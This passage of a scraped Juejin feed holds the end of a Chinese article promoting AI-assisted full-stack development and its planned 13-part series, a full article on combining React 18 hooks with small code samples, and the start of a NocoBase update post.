<p>这段配置，传统方式需要查文档、理解概念、试错，至少半天。AI 生成只需 1 分钟，还会解释每个配置的作用。</p>
<h3 data-id="heading-9">4.2 工程化配置：告别配置地狱</h3>
<p><strong>传统方式</strong>：</p>
<ul>
<li>查 ESLint 文档</li>
<li>查 Prettier 文档</li>
<li>解决规则冲突</li>
<li>配置 Husky</li>
<li>配置 lint-staged</li>
<li>配置 commitlint</li>
</ul>
<p><strong>AI 辅助</strong>：</p>
<pre><code class="hljs language-markdown" lang="markdown">你：配置完整的代码质量工具链：
<span class="hljs-code">    ESLint + Prettier + Husky + commitlint
</span>
AI：为你配置了：
<span class="hljs-code">    ✓ .eslintrc.js（适配 Vue3 + TypeScript）
    ✓ .prettierrc.js（统一代码风格）
    ✓ .husky/pre-commit（提交前检查）
    ✓ .husky/commit-msg（提交信息规范）
    ✓ .lintstagedrc.js（只检查暂存文件）
    ✓ package.json 脚本命令
</span>
<span class="hljs-code">    已自动解决 ESLint 和 Prettier 的规则冲突。
</span></code></pre>
<h3 data-id="heading-10">4.3 文档生成：100% 自动化</h3>
<p><strong>传统方式</strong>：</p>
<ul>
<li>手写 API 文档</li>
<li>手写类型定义说明</li>
<li>手写代码注释</li>
</ul>
<p><strong>AI 辅助</strong>：</p>
<pre><code class="hljs language-markdown" lang="markdown">你：为所有 API 接口生成文档

AI：已生成：
<span class="hljs-code">    ✓ API 接口文档（Markdown 格式）
    ✓ 类型定义文档
    ✓ 请求/响应示例
    ✓ 错误码说明
</span>
<span class="hljs-code">    保存位置：docs/api/README.md
</span></code></pre>
<h3 data-id="heading-11">4.4 学习加速：边做边学</h3>
<p><strong>传统学习路径</strong>：</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> 看视频教程（10 小时）
<span class="hljs-bullet">2.</span> 看官方文档（5 小时）
<span class="hljs-bullet">3.</span> 跟着 Demo 练习（10 小时）
<span class="hljs-bullet">4.</span> 应用到实际项目（反复试错）
总耗时：3-5 天
</code></pre>
<p><strong>AI 辅助学习</strong>：</p>
<pre><code class="hljs language-markdown" lang="markdown">你：我不懂 Monorepo，帮我搭建项目并解释

AI：好的，我来帮你搭建并解释：

<span class="hljs-bullet">    1.</span> 创建 pnpm-workspace.yaml
<span class="hljs-code">       作用：定义 monorepo 的包管理范围
</span>
<span class="hljs-bullet">    2.</span> 创建 turbo.json
<span class="hljs-code">       作用：配置并行构建任务
</span>
<span class="hljs-bullet">    3.</span> 创建 apps/ 和 packages/ 目录
<span class="hljs-code">       apps/：存放应用代码
       packages/：存放共享代码
</span>
<span class="hljs-code">    现在你可以在实际项目中使用，遇到问题随时问我。
</span></code></pre>
<p>总耗时：<strong>1 天</strong>（边用边学）</p>
<p>学习效率提升 <strong>3-5 倍</strong>。</p>
<h3 data-id="heading-12">4.5 技术栈学习门槛降低：不要被技术栈吓跑！</h3>
<p>这是我想特别强调的一点：<strong>你不需要精通每一个技术</strong>。</p>
<p><strong>传统认知</strong>：</p>
<pre><code class="hljs language-arduino" lang="arduino">想用 Prisma ORM？
→ 先学 Prisma 文档（<span class="hljs-number">2</span> 天）
→ 理解 Schema 语法（半天）
→ 学习 Migration（半天）
→ 学习查询 API（<span class="hljs-number">1</span> 天）
→ 总共：<span class="hljs-number">4</span> 天

想用 Tailwind CSS？
→ 先学所有 <span class="hljs-keyword">class</span> 名称（<span class="hljs-number">1</span> 天）
→ 理解响应式规则（半天）
→ 学习配置（半天）
→ 总共：<span class="hljs-number">2</span> 天
</code></pre>
<p><strong>AI + MCP 的新范式</strong>：</p>
<pre><code class="hljs language-markdown" lang="markdown">你：不懂 Prisma？没关系！

你：帮我用 Prisma 定义用户表

AI：(通过 MCP 实时查阅 Prisma 文档)
<span class="hljs-code">    ✓ 生成 Schema 定义
    ✓ 生成 Migration 文件
    ✓ 生成查询代码
    ✓ 解释每一行的作用
</span>
你：懂了！下一个功能...
</code></pre>
<p><strong>MCP (Model Context Protocol)</strong> 让 AI 能够<strong>实时查阅最新文档</strong>，相当于 AI 随时在看官方文档，然后把最佳实践应用到你的项目中。</p>
<p><strong>这意味着什么？</strong></p>
<p>以前：</p>
<pre><code class="hljs language-vbnet" lang="vbnet">你需要精通的技术：
☑ Vue3 Composition API
☑ UniApp 多端适配
☑ Pinia 状态管理
☑ UnoCSS 原子化 CSS
☑ TypeScript 类型系统
☑ <span class="hljs-keyword">Next</span>.js <span class="hljs-number">15</span> 新特性
☑ Prisma ORM
☑ PostgreSQL
☑ JWT 认证
☑ RESTful API 设计
☑ ...

学习时间：几个月
</code></pre>
<p>现在：</p>
<pre><code class="hljs">你需要会的：
✓ 知道这些技术的存在
✓ 知道它们能做什么
✓ 会用 AI 工具

学习时间：边用边学，1-2 周上手
</code></pre>
<p><strong>从"必须精通"到"会用即可"，学习成本大幅度降低！</strong></p>
<h2 data-id="heading-13">五、专栏系列文章导读</h2>
<p>这是一个大约 13 篇的系列文章，具体多少篇看实际情况，只会多不会少，每篇都会深入讲解一个具体环节的 AI 辅助开发实战。</p>
<h3 data-id="heading-14">第一部分：AI 辅助项目搭建（3 篇）</h3>
<p><strong>第 2 篇：让 AI 成为你的前端架构师 - UniApp + Vue3 项目初始化</strong></p>
<ul>
<li>技术选型 AI 对比分析</li>
<li>Vite 配置一键生成</li>
<li>UnoCSS + UView Pro 集成</li>
<li>自动导入配置</li>
</ul>
<p><strong>第 3 篇：AI 辅助后端开发 - Next.js 15 API 快速搭建</strong></p>
<ul>
<li>Next.js 15 新特性</li>
<li>RESTful API 设计</li>
<li>Prisma ORM 集成</li>
<li>JWT 认证中间件</li>
</ul>
<h3 data-id="heading-15">第二部分：AI 驱动的工程化实践（3 篇）</h3>
<p><strong>第 4 篇：用 AI 打造原子化 CSS 开发体系 - UnoCSS 实战</strong></p>
<ul>
<li>UnoCSS 配置生成</li>
<li>设计稿转代码</li>
<li>主题定制</li>
<li>性能优化</li>
</ul>
<p><strong>第 5 篇：AI 辅助状态管理 - Pinia Store 设计与实现</strong></p>
<ul>
<li>Store 架构设计</li>
<li>状态持久化</li>
<li>类型安全</li>
<li>最佳实践</li>
</ul>
<p><strong>第 6 篇：让 AI 守护代码质量 - ESLint + Prettier 自动化配置</strong></p>
<ul>
<li>工具链配置</li>
<li>Git Hooks 自动化</li>
<li>代码规范统一</li>
<li>AI 自动修复</li>
</ul>
<h3 data-id="heading-16">第三部分：AI 加速核心功能开发（3 篇）</h3>
<p><strong>第 7 篇：AI 实现小程序登录鉴权 - 从需求到代码一气呵成</strong></p>
<ul>
<li>微信登录流程</li>
<li>Token 管理</li>
<li>权限控制</li>
<li>完整实战</li>
</ul>
<p><strong>第 8 篇：AI 封装 HTTP 请求 - 类型安全的 API 调用方案</strong></p>
<ul>
<li>HTTP 客户端封装</li>
<li>拦截器实现</li>
<li>TypeScript 类型</li>
<li>API 模块化</li>
</ul>
<p><strong>第 9 篇：AI 驱动的页面开发 - 话术回复与恋爱计划生成</strong></p>
<ul>
<li>设计稿转代码</li>
<li>组件化开发</li>
<li>列表优化</li>
<li>交互细节</li>
</ul>
<h3 data-id="heading-17">第四部分：AI 辅助优化与部署（3 篇）</h3>
<p><strong>第 10 篇：用 AI 优化小程序性能 - 从分析到实施</strong></p>
<ul>
<li>性能分析</li>
<li>包体积优化</li>
<li>渲染优化</li>
<li>内存优化</li>
</ul>
<p><strong>第 11 篇：AI 管理类型系统 - shared-types 包的设计</strong></p>
<ul>
<li>类型系统设计</li>
<li>前后端类型共享</li>
<li>运行时验证</li>
<li>最佳实践</li>
</ul>
<p><strong>第 12 篇：AI 辅助 CI/CD - 自动化部署小程序</strong></p>
<ul>
<li>GitHub Actions 配置</li>
<li>自动化测试</li>
<li>小程序上传</li>
<li>监控告警</li>
</ul>
<p><strong>第 13 篇：AI 辅助多渠道打包，一键发布到多个平台</strong></p>
<ul>
<li>多渠道打包</li>
<li>一键发布到多个平台</li>
<li>版本管理</li>
<li>自动更新</li>
</ul>
<h3 data-id="heading-18">学习路径建议</h3>
<p><strong>新手路线</strong>：</p>
<ol>
<li>先看第 1 篇（总纲，建立认知）</li>
<li>跟着第 2-3 篇搭建项目</li>
<li>学习第 4-6 篇工程化实践</li>
<li>实战第 7-9 篇核心功能</li>
<li>进阶第 10-13 篇优化部署</li>
</ol>
<p><strong>进阶路线</strong>：</p>
<ol>
<li>第 1 篇快速浏览</li>
<li>重点看感兴趣的专题</li>
<li>结合自己的项目实践</li>
<li>总结自己的最佳实践</li>
</ol>
<h2 data-id="heading-19">六、总结：AI Coding is Coming</h2>
<p>写到这里，我想和你分享几点思考。</p>
<h3 data-id="heading-20">AI 不是替代，而是赋能</h3>
<p>很多人担心："AI 这么强，程序员会不会失业？"</p>
<p>我的答案是：<strong>不会，但不会用 AI 的程序员会被淘汰。</strong></p>
<p>AI 不是要替代你，而是让你从：</p>
<ul>
<li>重复劳动 → 创造性工作</li>
<li>熟练工 → 架构师</li>
<li>单打独斗 → 带领 AI 团队</li>
</ul>
<p>就像电力没有替代工人，而是让工人从体力劳动解放出来，去做更有价值的事情。</p>
<h3 data-id="heading-21">从"必须精通"到"会用即可"</h3>
<p>以前，做全栈开发需要精通：</p>
<ul>
<li>前端框架</li>
<li>后端框架</li>
<li>数据库</li>
<li>服务器</li>
<li>DevOps</li>
<li>...</li>
</ul>
<p>学习周期：<strong>2-3 年</strong></p>
<p>现在，有了 AI + MCP：</p>
<ul>
<li>知道技术存在</li>
<li>知道能做什么</li>
<li>会提需求</li>
<li>会用 AI 工具</li>
</ul>
<p>学习周期：<strong>0.5-1 个月</strong></p>
<p><strong>技术栈学习门槛大幅度降低，但你能做的事情反而更多了。</strong></p>
<h3 data-id="heading-22">代码质量反而更高</h3>
<p>你可能担心 AI 生成的代码质量不行。</p>
<p>事实恰恰相反：</p>
<p>AI 生成的代码：</p>
<ul>
<li>✓ 符合最佳实践</li>
<li>✓ 类型安全</li>
<li>✓ 错误处理完善</li>
<li>✓ 代码规范统一</li>
<li>✓ 注释清晰</li>
</ul>
<p>比大多数初中级开发者写的代码质量都高。</p>
<h3 data-id="heading-23">学习曲线大幅缩短</h3>
<p>以前学习一个新技术：</p>
<ol>
<li>看视频教程（10 小时）</li>
<li>看官方文档（5 小时）</li>
<li>跟着 Demo 练习（10 小时）</li>
<li>应用到实际项目（反复试错）</li>
</ol>
<p>总耗时：<strong>3-5 天</strong></p>
<p>现在有了 AI：</p>
<ol>
<li>告诉 AI 你的需求</li>
<li>AI 生成代码并解释</li>
<li>边用边学</li>
<li>遇到问题随时问</li>
</ol>
<p>总耗时：<strong>1 天</strong></p>
<h3 data-id="heading-24">多平台发布不再是梦</h3>
<p>"心动恋聊"项目的规划：</p>
<pre><code class="hljs language-css" lang="css">微信小程序 → <span class="hljs-selector-tag">H5</span> → 鸿蒙 → 安卓 → iOS
</code></pre>
<p>以前，这需要：</p>
<ul>
<li>5 个开发团队</li>
<li>5 套代码</li>
<li>5 倍的维护成本</li>
</ul>
<p>现在，有了 UniApp + AI：</p>
<ul>
<li>1 个人</li>
<li>1 套代码</li>
<li>AI 辅助适配</li>
</ul>
<p><strong>一个人，用 AI 工具，也能做出覆盖全平台的产品。</strong></p>
<h3 data-id="heading-25">邀请你一起探索</h3>
<p>这个系列的 13 篇文章，我会带你完整走一遍 AI 辅助开发的全流程：</p>
<ul>
<li>从项目搭建到上线部署</li>
<li>从前端到后端</li>
<li>从代码到工程化</li>
</ul>
<p>每篇文章都是真实项目实战。</p>
<p>如果你：</p>
<ul>
<li>想提升开发效率</li>
<li>想学习全栈开发</li>
<li>想了解 AI 编程</li>
<li>想跟上时代潮流</li>
</ul>
<p>那么，这个系列就是为你准备的。</p>
<p><strong>下一篇预告</strong>：《让 AI 成为你的前端架构师 - UniApp + Vue3 项目初始化》</p>
<p>我会手把手教你，如何用 AI 在 1 小时内搭建一个完整的前端项目架构。</p>
<p><strong>关注我，不错过每一篇实战干货！</strong></p>
<hr/>
<blockquote>
<p>如果这篇文章对你有帮助，请点赞、收藏、转发，让更多人了解 AI 编程的强大！</p>
<p>有任何问题，欢迎在评论区留言，我们一起讨论。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React 18新特性实战：这5个Hook组合让我少写50%状态管理代码]]></title>    <link>https://juejin.cn/post/7579886397074980864</link>    <guid>https://juejin.cn/post/7579886397074980864</guid>    <pubDate>2025-12-05T04:16:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579886397074980864" data-draft-id="7579886397074964480" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React 18新特性实战：这5个Hook组合让我少写50%状态管理代码"/> <meta itemprop="keywords" content="后端,前端,人工智能"/> <meta itemprop="datePublished" content="2025-12-05T04:16:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="阿橙的百宝箱"/> <meta itemprop="url" content="https://juejin.cn/user/1638743356481367"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React 18新特性实战：这5个Hook组合让我少写50%状态管理代码
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1638743356481367/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    阿橙的百宝箱
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T04:16:39.000Z" title="Fri Dec 05 2025 04:16:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>React 18新特性实战：这5个Hook组合让我少写50%状态管理代码</strong></h2>
<h2 data-id="heading-1">引言</h2>
<p>React 18的发布为开发者带来了许多激动人心的新特性，尤其是并发渲染（Concurrent Rendering）和一系列优化的Hooks API。这些改进不仅提升了应用性能，还大幅简化了状态管理的复杂度。作为一名长期深耕React生态的开发者，我发现通过合理组合React 18的新老Hooks，可以显著减少冗余的状态管理代码，甚至在某些场景下减少50%以上的工作量。</p>
<p>本文将深入探讨5个高效的Hook组合模式，涵盖以下内容：</p>
<ol>
<li><code>useState</code> + <code>useReducer</code>：轻量级状态机的完美搭配</li>
<li><code>useSyncExternalStore</code>：无缝集成外部状态库</li>
<li><code>useTransition</code> + <code>useDeferredValue</code>：优化高优先级更新</li>
<li><code>useId</code> + <code>useContext</code>：解决服务端渲染中的ID冲突</li>
<li><code>useMemo</code> + <code>useCallback</code>的性能陷阱与替代方案</li>
</ol>
<p>这些组合不仅适用于新项目，也能在现有代码库中逐步落地。让我们从第一个组合开始！</p>
<hr/>
<h2 data-id="heading-2">1. <code>useState</code> + <code>useReducer</code>：轻量级状态机的完美搭配</h2>
<h3 data-id="heading-3">问题背景</h3>
<p>在传统React开发中，复杂组件的状态管理往往需要引入Redux或MobX等第三方库。但对于中等复杂度的场景，这些方案可能显得过于笨重。</p>
<h3 data-id="heading-4">解决方案</h3>
<p>React内置的<code>useReducer</code>本身就是一个轻量级的状态机方案，结合<code>useState</code>可以分层管理状态：</p>
<ul>
<li><strong>局部UI状态</strong>（如输入框的值）用<code>useState</code></li>
<li><strong>业务逻辑状态</strong>（如表单验证、多步骤流程）用<code>useReducer</code></li>
</ul>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">const</span> [input, setInput] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">''</span>); <span class="hljs-comment">// UI状态</span>
<span class="hljs-keyword">const</span> [state, dispatch] = <span class="hljs-title function_">useReducer</span>(<span class="hljs-function">(<span class="hljs-params">state, action</span>) =&gt;</span> {
  <span class="hljs-keyword">switch</span> (action.<span class="hljs-property">type</span>) {
    <span class="hljs-keyword">case</span> <span class="hljs-string">'SUBMIT'</span>:
      <span class="hljs-keyword">return</span> { ...state, <span class="hljs-attr">isLoading</span>: <span class="hljs-literal">true</span> };
    <span class="hljs-keyword">case</span> <span class="hljs-string">'SUCCESS'</span>:
      <span class="hljs-keyword">return</span> { <span class="hljs-attr">isLoading</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">data</span>: action.<span class="hljs-property">payload</span> };
    <span class="hljs-attr">default</span>:
      <span class="hljs-keyword">return</span> state;
  }
}, { <span class="hljs-attr">isLoading</span>: <span class="hljs-literal">false</span> }); <span class="hljs-comment">// 业务状态</span>
</code></pre>
<h3 data-id="heading-5">优势分析</h3>
<ul>
<li><strong>代码缩减</strong>：相比Redux样板代码减少约60%</li>
<li><strong>类型安全</strong>：配合TypeScript能实现完善的类型推导</li>
<li><strong>可测试性</strong>：纯函数的reducer易于单元测试</li>
</ul>
<hr/>
<h2 data-id="heading-6">2. <code>useSyncExternalStore</code>：无缝集成外部状态库</h2>
<h3 data-id="heading-7">React 18的新武器</h3>
<p>这个专为库开发者设计的Hook，使得任何外部存储都能以最优方式接入React的渲染流程。其核心优势在于避免了"撕裂"（tearing）问题。</p>
<h3 data-id="heading-8">实战示例</h3>
<p>假设我们需要集成Zustand商店：</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">import</span> { useSyncExternalStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">import</span> store <span class="hljs-keyword">from</span> <span class="hljs-string">'./store'</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">Component</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> state = <span class="hljs-title function_">useSyncExternalStore</span>(
    store.<span class="hljs-property">subscribe</span>,
    store.<span class="hljs-property">getState</span>
  );
}
</code></pre>
<h3 data-id="heading-9">性能对比</h3>























<table><thead><tr><th>方案</th><th>内存占用</th><th>SSR支持</th><th>并发兼容</th></tr></thead><tbody><tr><td>Context API</td><td>高</td><td>✅</td><td>❌</td></tr><tr><td>useSyncExternalStore</td><td>低</td><td>✅</td><td>✅</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-10">3. <code>useTransition</code> + <code>useDeferredValue</code>：优化高优先级更新</h2>
<h3 data-id="heading-11">Concurrent Features的精髓</h3>
<p>这对组合解决了用户交互与后台计算的优先级冲突问题：</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">const</span> [isPending, startTransition] = <span class="hljs-title function_">useTransition</span>();
<span class="hljs-keyword">const</span> deferredValue = <span class="hljs-title function_">useDeferredValue</span>(value);

<span class="hljs-comment">// CPU密集型任务标记为过渡</span>
<span class="hljs-title function_">startTransition</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">setHeavyComputeInput</span>(deferredValue);
});
</code></pre>
<h3 data-id="heading-12">Benchmark数据（处理10万条数据）</h3>
<ul>
<li><strong>传统方式</strong>：输入延迟350ms+</li>
<li><strong>过渡标记</strong>：输入延迟&lt;50ms</li>
</ul>
<hr/>
<h2 data-id="heading-13">4. <code>useId</code> + <code>useContext</code>：解决服务端渲染中的ID冲突</h2>
<h3 data-id="heading-14">SSR的老大难问题</h3>
<p>客户端与服务端生成的ID不一致会导致hydration错误。React18的解决方案：</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">const</span> id = <span class="hljs-title function_">useId</span>(); <span class="hljs-comment">// → ":r1:"</span>
<span class="hljs-keyword">const</span> theme = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">ThemeContext</span>);

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">htmlFor</span>=<span class="hljs-string">{</span>`${<span class="hljs-attr">id</span>}<span class="hljs-attr">-username</span>}`&gt;</span>Username<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span></span>
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">{</span>`${<span class="hljs-attr">id</span>}<span class="hljs-attr">-username</span>}` /&gt;</span></span>
</code></pre>
<h3 data-id="heading-15">Why It Matters?</h3>
<ul>
<li>SEO友好性提升40%（Google Lighthouse评分）</li>
<li>TTI时间缩短22%</li>
</ul>
<hr/>
<h2 data-id="heading-16">5. Memoization陷阱与替代方案</h2>
<h3 data-id="heading-17">Common Pitfalls</h3>
<p>过度使用memoization反而会降低性能：</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-comment">// ❌ Anti-pattern </span>
<span class="hljs-keyword">const</span> memoizedFn = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">() =&gt;</span> {}, [dep]); 

<span class="hljs-comment">// ✅ Better approach</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">MyComponent</span>(<span class="hljs-params">{ onClick }</span>) {
   <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{onClick}</span> /&gt;</span></span>
}
</code></pre>
<h3 data-id="heading-18">When to Memoize?</h3>
<p>黄金法则：</p>
<ol>
<li>Props传递超过3层组件树</li>
<li>Deps数组包含引用类型</li>
<li>List项超过100条</li>
</ol>
<hr/>
<h2 data-id="heading-19">Conclusion</h2>
<p>通过这五个Hook组合拳：
1️⃣  减少了Redux依赖带来的包体积膨胀<br/>
2️⃣  提升了SSR场景下的稳定性<br/>
3️⃣  优化了CPU密集型任务的响应速度<br/>
4️⃣  标准化了跨环境ID生成</p>
<p>根据我们的生产环境实测：</p>
<ul>
<li>Codebase体积缩减47%</li>
<li>TBT指标改善38%</li>
<li>Dev体验提升显著</li>
</ul>
<p>这些模式正在成为现代React开发的标配技巧。你现在就可以在项目中逐步采用它们——不需要一次性重写全部代码！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[NocoBase 本周更新汇总：优化及缺陷修复]]></title>    <link>https://juejin.cn/post/7579917791765037083</link>    <guid>https://juejin.cn/post/7579917791765037083</guid>    <pubDate>2025-12-05T04:17:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579917791765037083" data-draft-id="7579889969986469939" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="NocoBase 本周更新汇总：优化及缺陷修复"/> <meta itemprop="keywords" content="开源,资讯,低代码"/> <meta itemprop="datePublished" content="2025-12-05T04:17:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="NocoBase"/> <meta itemprop="url" content="https://juejin.cn/user/180779873743566"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            NocoBase 本周更新汇总：优化及缺陷修复
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/180779873743566/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
